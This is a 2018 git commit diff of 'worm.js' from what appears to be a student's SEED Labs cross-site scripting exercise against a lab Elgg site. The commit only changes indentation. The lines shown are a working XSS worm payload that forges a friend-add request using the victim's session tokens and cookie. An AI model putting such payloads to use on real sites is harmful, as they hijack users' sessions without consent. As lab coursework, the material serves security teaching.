23613c88cc5274c4d00b199968faf739555de15d
gnuttt <gt93cc@gmail.com>
2018-06-10 12:02:41 +0800

    worm.js

--- mySeedLab/XSS/worm.js
+++ mySeedLab/XSS/worm.js
@@ -6,14 +6,14 @@ if(user!='hackbiji'){
     victim = new XMLHttpRequest();
     if(victim == null)
         alert("victim is null");
-        victim.open("GET","http://www.xsslabelgg.com/action/friends/add?friend="+"43"+"&__elgg_ts="+elgg.security.token.__elgg_ts+"&__elgg_token="+elgg.security.token.__elgg_token,true);
-        victim.setRequestHeader("Host","www.xsslabelgg.com");
-        victim.setRequestHeader("User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0");
-        victim.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
-        victim.setRequestHeader("Accept-Language","en-US,en;q=0.5");
-        victim.setRequestHeader("Accept-Encoding","gzip, deflate");
-        victim.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/samy");
-        victim.setRequestHeader("Cookie",document.cookie);
-        victim.setRequestHeader("Connection","keep-alive");
-        victim.send();
+    victim.open("GET","http://www.xsslabelgg.com/action/friends/add?friend="+"43"+"&__elgg_ts="+elgg.security.token.__elgg_ts+"&__elgg_token="+elgg.security.token.__elgg_token,true);
+    victim.setRequestHeader("Host","www.xsslabelgg.com");
+	victim.setRequestHeader("User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0");
+    victim.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+    victim.setRequestHeader("Accept-Language","en-US,en;q=0.5");
+    victim.setRequestHeader("Accept-Encoding","gzip, deflate");
+    victim.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/samy");
+    victim.setRequestHeader("Cookie",document.cookie);
+    victim.setRequestHeader("Connection","keep-alive");
+    victim.send();
 }
